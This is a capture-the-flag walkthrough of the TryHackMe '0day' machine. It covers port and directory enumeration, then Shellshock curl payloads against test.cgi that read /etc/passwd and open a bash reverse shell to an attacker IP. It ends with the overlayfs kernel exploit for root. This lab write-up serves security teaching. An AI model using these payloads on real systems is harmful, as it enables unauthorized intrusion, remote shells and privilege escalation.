![2025-01-13_10-17](https://github.com/user-attachments/assets/72b997ff-2688-4b5b-80b8-10e1e6f47e07)

Hi, here is how to successfully complete the machine https://tryhackme.com/r/room/0day

i start scanning the ports with nmap, we can see that ports 22 and 80 are open.
<pre><code> sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.159.107 | tee nmap1.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 17:08 -03
Nmap scan report for 10.10.159.107
Host is up (0.35s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.32 seconds</code></pre>

<pre><code> sudo nmap -p22,80 -sCV -Pn 10.10.159.107 | tee nmap2.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 17:08 -03
Nmap scan report for 10.10.159.107
Host is up (0.35s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.32 seconds</code></pre>

there is nothing we can do with this page so I am going to look for directories.
![2025-01-13_10-25](https://github.com/user-attachments/assets/5c56fc93-0117-4afd-ac2e-f4c0f68d89ec)


there are many things that will get you nowhere, like the ssh key in /backup/.

but if we look carefully we will find the cgi-bin directory
<pre><code> gobuster dir -u http://10.10.159.107/ -w /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 | tee gobuster.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.159.107/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 311] [--> http://10.10.159.107/img/]
/cgi-bin              (Status: 301) [Size: 315] [--> http://10.10.159.107/cgi-bin/]
/uploads              (Status: 301) [Size: 315] [--> http://10.10.159.107/uploads/]
/admin                (Status: 301) [Size: 313] [--> http://10.10.159.107/admin/]
/css                  (Status: 301) [Size: 311] [--> http://10.10.159.107/css/]
/js                   (Status: 301) [Size: 310] [--> http://10.10.159.107/js/]
/backup               (Status: 301) [Size: 314] [--> http://10.10.159.107/backup/]
/secret               (Status: 301) [Size: 314] [--> http://10.10.159.107/secret/]
/server-status        (Status: 403) [Size: 293]

===============================================================
Finished
===============================================================</code></pre>

I did a scan with gobuster to find files that might be useful.
<pre><code> gobuster dir -u http://10.10.101.200/cgi-bin/ -w /home/maxi/Escritorio/SecLists/Discovery/Web-Content/raft-medium-words.txt -x .cgi,.sh,.pl,.py,.php -t 100 | tee gosbuter-cgi-bin.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.101.200/cgi-bin/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,cgi,sh,pl,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html.sh             (Status: 403) [Size: 296]
/.html.pl             (Status: 403) [Size: 296]
/.html                (Status: 403) [Size: 293]
/.html.py             (Status: 403) [Size: 296]
/.html.php            (Status: 403) [Size: 297]
/.html.cgi            (Status: 403) [Size: 297]
/.htm                 (Status: 403) [Size: 292]
/.htm.cgi             (Status: 403) [Size: 296]
/.htm.sh              (Status: 403) [Size: 295]
/.htm.pl              (Status: 403) [Size: 295]
/.htm.py              (Status: 403) [Size: 295]
/.htm.php             (Status: 403) [Size: 296]
/test.cgi             (Status: 200) [Size: 13]
/.                    (Status: 403) [Size: 288]
/.htaccess            (Status: 403) [Size: 297]
/.htaccess.php        (Status: 403) [Size: 301]
/.htaccess.py         (Status: 403) [Size: 300]
/.htaccess.cgi        (Status: 403) [Size: 301]
/.htaccess.pl         (Status: 403) [Size: 300]
/.htaccess.sh         (Status: 403) [Size: 300] </code></pre>

The Shellshock vulnerability (CVE-2014-6271) in the test.cgi file, affects the way Bash handles environment variables. This vulnerability allows arbitrary commands to be executed if certain environment variables are set correctly.

When a CGI script (e.g., test.cgi) is executed, it can access environment variables defined by the web server. CGI scripts often receive and process data from HTTP requests, and HTTP headers are often used to define environment variables that the script then executes.

Bash, when executing a script, evaluates the environment variables. Shellshock takes advantage of the fact that Bash does not properly validate the data in the environment variables before executing them. If a command is included in the declaration of an environment variable, Bash will execute it as part of the process.

to check this vulnerability I am going to run the following command, which should allow me to read /etc/passwd
<pre><code> curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd;" http://10.10.101.200/cgi-bin/test.cgi

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin </code></pre>


and just like that I got an RCE, the next step is clear, we are going to make a reverse shell.
<pre><code> nc -nlvp 1234 </code></pre>


<pre><code> curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.9.1.249/1234 0>&1" http://10.10.101.200/cgi-bin/test.cgi </code></pre>



<pre><code> Connection from 10.10.101.200:40083
bash: cannot set terminal process group (867): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ whoami
whoami
www-data </code></pre>

<pre><code> www-data@ubuntu:/home/ryan$ ls
ls
user.txt </code></pre>


now that we have the user flag we need to escalate privileges, we are on a very old version of the linux kernel so we probably have some vulnerability.
<pre><code> www-data@ubuntu:/home/ryan$ uname -a
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux </code></pre>

I will use searchexploit to search for vulnerabilities.
<pre><code> searchsploit linux kernel 3.13.0
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation          | solaris/local/15962.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                  | linux/local/50135.c
Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Es | linux/local/41995.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Pr | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Pr | linux/local/37293.txt
Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privileg | linux_x86-64/local/33516.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Priv | linux_x86-64/local/31347.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)    | linux/local/31346.c
Linux Kernel 3.4 < 3.13.2 - recvmmsg x32 compat (PoC)                              | linux/dos/31305.c
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free               | linux/dos/43234.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                         | linux/local/41886.c
Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                  | linux/local/34923.c
Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation       | linux_x86-64/local/44302.c
Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of Service       | linux/dos/42136.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalation                       | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation  | linux/local/45553.c
Linux Kernel < 4.13.1 - BlueTooth Buffer Overflow (PoC)                            | linux/dos/42762.txt
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation      | linux/local/45010.c
Linux Kernel < 4.14.rc3 - Local Denial of Service                                  | linux/dos/42932.c
Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak                           | linux/local/44325.c
Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption               | linux/dos/44832.txt
Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free                                     | linux/dos/44579.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation             | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privi | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escala | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Lo | linux/local/47169.c
Linux Kernel < 4.5.1 - Off-By-One (PoC)                                            | linux/dos/44301.c
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results </code></pre>

this one may work, I'm going to copy the file to the victim machine
<pre><code> Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Pr | linux/local/37292.c </code></pre>

when I try to execute the code, I get the following error message

indicates that the gcc compiler cannot find the cc1 program, which is an essential part of the C compiler. This usually happens when the package containing the tools needed to compile C code is missing, or if the compilation environment is not configured correctly.

Fixing it is very simple, we only need to fix the PATH
<pre><code> www-data@ubuntu:/tmp$ gcc exploit.c -o exploit
gcc exploit.c -o exploit
gcc: error trying to exec 'cc1': execvp: No such file or directory </code></pre>

<pre><code> www-data@ubuntu:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin </code></pre>

now the exploit ran without problems and we have access to the root flag
<pre><code> www-data@ubuntu:/tmp$ ./exploit
./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# whoami
root

# cat /root/root.txt
THM{} </code></pre>


